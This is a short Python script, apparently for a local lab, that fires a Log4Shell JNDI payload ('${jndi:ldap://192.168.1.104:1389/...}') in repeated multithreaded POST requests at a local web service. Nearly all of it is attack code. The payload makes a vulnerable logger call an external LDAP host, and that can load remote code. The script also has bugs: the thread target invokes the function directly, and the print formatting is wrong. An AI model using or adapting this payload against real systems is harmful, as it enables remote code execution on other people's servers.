import requests as r
import threading as t

def make_post_call():
    for i in range(1000):
        payload ='${jndi:ldap://192.168.1.104:1389/Test}'
        #payload = 'Martin'
        response = r.post('http://localhost:8080/post', data=payload)
        print("Sent request, got %d", response.status_code)


if __name__ == '__main__':
    threads = list()
    for i in range(5):
        thread = t.Thread(target=make_post_call())
        threads.append(thread)
        thread.start()

    for t in threads:
        t.join()
